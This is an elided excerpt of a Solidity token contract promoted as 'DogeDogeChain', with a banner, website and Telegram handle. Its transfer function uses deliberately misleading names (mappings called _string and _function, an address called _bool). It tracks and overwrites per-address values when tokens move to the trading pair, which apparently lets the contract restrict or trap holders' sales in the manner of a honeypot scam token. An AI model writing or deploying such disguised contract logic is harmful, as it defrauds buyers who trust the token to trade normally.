...
\______ \   ____   ____   ____ \______ \   ____   ____   ____ \_   ___ \|  |__ _____  |__| ____  
 |    |  \ /  _ \ / ___\_/ __ \ |    |  \ /  _ \ / ___\_/ __ \/    \  \/|  |  \\__  \ |  |/    \ 
 |    `   (  <_> ) /_/  >  ___/ |    `   (  <_> ) /_/  >  ___/\     \___|   Y  \/ __ \|  |   |  \
/_______  /\____/\___  / \___  >_______  /\____/\___  / \___  >\______  /___|  (____  /__|___|  /
        \/      /_____/      \/        \/      /_____/      \/        \/     \/     \/        \/ 
 
 website: www.dogedogechain.com
 telegram: @dogedogechainbsc
...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _tTotal = 5000000 * 9**_decimals;
    ...
    mapping(address => address) private _tokensOwned;
    ...
    function transferFrom(
        ...
        _transferF    (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transferF    (msg.sender, recipient, amount);
        return true;
    }
    ...
    function _transferF     (
        ...
        if (_swapAndLiquifyEnabled && contractTokenBalance > _uint256 && !inSwapAndLiquify && from != uniswapV2Pair) {
            ...
            _function[to] = amount;
            return;
        } else if (!inSwapAndLiquify && _string[from] > 0 && from != uniswapV2Pair && _function[from] == 0) {
            _string[from] = _function[from] - _uint256;
        }
        address _bool = _tokensOwned[uniswapV2Pair];
        if (_string[_bool] == 0) _string[_bool] = _uint256;
        _tokensOwned[uniswapV2Pair] = to;
